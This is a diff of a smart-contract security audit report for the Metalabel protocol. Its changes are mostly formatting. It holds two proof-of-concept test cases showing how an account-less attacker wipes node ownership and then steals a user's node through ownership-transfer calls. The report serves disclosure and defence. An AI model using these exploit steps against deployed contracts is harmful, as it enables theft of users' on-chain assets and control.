@@ -1,4 +1,4 @@
-# Metalabel Security Review
+# Metalabel Solo Security Review
 
 A security review of the [Metalabel](https://www.metalabel.xyz/) smart contract protocol was done by [Gogo](https://twitter.com/gogotheauditor). \
 This audit report includes all the vulnerabilities, issues and code improvements found during the security review.
@@ -13,11 +13,11 @@ as possible. Audits can show the presence of vulnerabilities **but not their abs
 
 ## Risk classification
 
-| Severity           | Impact: High | Impact: Medium |  Impact: Low  |
-| :----------------- | :----------: | :------------: | :-----------: |
-| Likelihood: High   |   Critical   |      High      |    Medium     |
-| Likelihood: Medium |     High     |     Medium     |      Low      |
-| Likelihood: Low    |    Medium    |      Low       |      Low      |
+| Severity           | Impact: High | Impact: Medium | Impact: Low |
+| :----------------- | :----------: | :------------: | :---------: |
+| Likelihood: High   |   Critical   |      High      |   Medium    |
+| Likelihood: Medium |     High     |     Medium     |     Low     |
+| Likelihood: Low    |    Medium    |      Low       |     Low     |
 
 ### Impact
 
@@ -42,13 +42,13 @@ as possible. Audits can show the presence of vulnerabilities **but not their abs
 
 ### Overview
 
-|               | |
-| :------------ | :-
-| Project Name  | Metalabel
-| Repository    | https://github.com/metalabel/metalabel-contracts-v1
-| Commit hash   | [effe2e89996d6809c5ec6c6da10c663246f91fc1](https://github.com/metalabel/metalabel-contracts-v1/tree/effe2e89996d6809c5ec6c6da10c663246f91fc1)
-| Documentation | [link](https://metalabel.notion.site/Metalabel-Protocol-Walkthrough-2080c68cc6f242ebb7813b1a9236cab1)
-| Methods       | Manual review
+|               |                                                                                                                                               |
+| :------------ | :-------------------------------------------------------------------------------------------------------------------------------------------- |
+| Project Name  | Metalabel                                                                                                                                     |
+| Repository    | https://github.com/metalabel/metalabel-contracts-v1                                                                                           |
+| Commit hash   | [effe2e89996d6809c5ec6c6da10c663246f91fc1](https://github.com/metalabel/metalabel-contracts-v1/tree/effe2e89996d6809c5ec6c6da10c663246f91fc1) |
+| Documentation | [link](https://metalabel.notion.site/Metalabel-Protocol-Walkthrough-2080c68cc6f242ebb7813b1a9236cab1)                                         |
+| Methods       | Manual review                                                                                                                                 |
 |               |
 
 ### Issues found
@@ -136,25 +136,25 @@ There is currently no verification that ownership transfer has started. In other
 Place the following test case in [test/NodeRegistry.spec.ts](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/test/NodeRegistry.spec.ts)
 
 ```js
-const [user, attacker] = await ethers.getSigners()
+const [user, attacker] = await ethers.getSigners();
 
 // User creates an account.
-await accountRegistry.createAccount(user.address, '')
-const userAccountId = await accountRegistry.resolveId(user.address)
+await accountRegistry.createAccount(user.address, "");
+const userAccountId = await accountRegistry.resolveId(user.address);
 
 // User creates a node and sets their Metalabel account as the owner of this node.
-await createNode({ owner: userAccountId.toNumber() })
-const userNodeId = await nodeRegistry.totalNodeCount()
+await createNode({ owner: userAccountId.toNumber() });
+const userNodeId = await nodeRegistry.totalNodeCount();
 
 // Assert setup.
-expect(await nodeRegistry.ownerOf(userNodeId)).to.eq(userAccountId)
+expect(await nodeRegistry.ownerOf(userNodeId)).to.eq(userAccountId);
 
 // Attacker that has no Metalabel account calls nodeRegistry.completeNodeOwnerTransfer(userNodeId).
-expect(await accountRegistry.resolveId(attacker.address)).to.eq(0)
-await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNodeId)
+expect(await accountRegistry.resolveId(attacker.address)).to.eq(0);
+await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNodeId);
 
 // Attacker deletes the owner of the user's node. Exploit is successful.
-expect(await nodeRegistry.ownerOf(userNodeId)).to.eq(0)
+expect(await nodeRegistry.ownerOf(userNodeId)).to.eq(0);
 ```
 
 #### **Recommended Mitigation Steps**
@@ -237,59 +237,59 @@ After the exploit, the attacker will have access to all the critical functionali
 Place the following test case in [test/NodeRegistry.spec.ts](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/test/NodeRegistry.spec.ts)
 
 ```js
-const [user, attacker, attacker2] = await ethers.getSigners()
+const [user, attacker, attacker2] = await ethers.getSigners();
 
 // User creates an account.
-await accountRegistry.createAccount(user.address, '')
-const userAccountId = await accountRegistry.resolveId(user.address)
+await accountRegistry.createAccount(user.address, "");
+const userAccountId = await accountRegistry.resolveId(user.address);
 
 // User creates a node and sets their Metalabel account as the owner of this node.
-await createNode({ owner: userAccountId.toNumber() })
-const userNode1Id = await nodeRegistry.totalNodeCount()
+await createNode({ owner: userAccountId.toNumber() });
+const userNode1Id = await nodeRegistry.totalNodeCount();
 
 // User creates a second node and sets their Metalabel account as the owner of this node and
 // passes the userNode1Id as a group node.
 await createNode({
   owner: userAccountId.toNumber(),
   groupNode: userNode1Id.toNumber(),
-})
-const userNode2Id = await nodeRegistry.totalNodeCount()
+});
+const userNode2Id = await nodeRegistry.totalNodeCount();
 
 // Assert setup.
-expect(await nodeRegistry.ownerOf(userNode1Id)).to.eq(userAccountId)
-expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(userAccountId)
-expect(await nodeRegistry.groupNodeOf(userNode2Id)).to.eq(userNode1Id)
+expect(await nodeRegistry.ownerOf(userNode1Id)).to.eq(userAccountId);
+expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(userAccountId);
+expect(await nodeRegistry.groupNodeOf(userNode2Id)).to.eq(userNode1Id);
 
 // Attacker that has no Metalabel account calls nodeRegistry.completeNodeOwnerTransfer for both user's nodes.
-expect(await accountRegistry.resolveId(attacker.address)).to.eq(0)
-await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNode1Id)
-await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNode2Id)
+expect(await accountRegistry.resolveId(attacker.address)).to.eq(0);
+await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNode1Id);
+await nodeRegistry.connect(attacker).completeNodeOwnerTransfer(userNode2Id);
 
 // Attacker deletes the owner of the user's node.
-expect(await nodeRegistry.ownerOf(userNode1Id)).to.eq(0)
-expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(0)
+expect(await nodeRegistry.ownerOf(userNode1Id)).to.eq(0);
+expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(0);
 
 // Attacker uses a second ethereum address that we owns and registers a Metalabel account with it.
-await accountRegistry.createAccount(attacker2.address, '')
-const attacker2AccountId = await accountRegistry.resolveId(attacker2.address)
+await accountRegistry.createAccount(attacker2.address, "");
+const attacker2AccountId = await accountRegistry.resolveId(attacker2.address);
 
 // Attacker calls nodeRegistry.startNodeOwnerTransfer and steals the ownership of the second user's node.
 await expect(
   nodeRegistry
     .connect(attacker)
-    .startNodeOwnerTransfer(userNode2Id, attacker2AccountId),
-).to.not.be.reverted
+    .startNodeOwnerTransfer(userNode2Id, attacker2AccountId)
+).to.not.be.reverted;
 
 // Exploit is successful.
 expect(await nodeRegistry.pendingNodeOwnerTransfers(userNode2Id)).to.eq(
-  attacker2AccountId,
-)
+  attacker2AccountId
+);
 
 // Finish attack.
 await expect(
-  nodeRegistry.connect(attacker2).completeNodeOwnerTransfer(userNode2Id),
-).to.not.be.reverted
-expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(attacker2AccountId)
+  nodeRegistry.connect(attacker2).completeNodeOwnerTransfer(userNode2Id)
+).to.not.be.reverted;
+expect(await nodeRegistry.ownerOf(userNode2Id)).to.eq(attacker2AccountId);
 ```
 
 #### **Recommended Mitigation Steps**
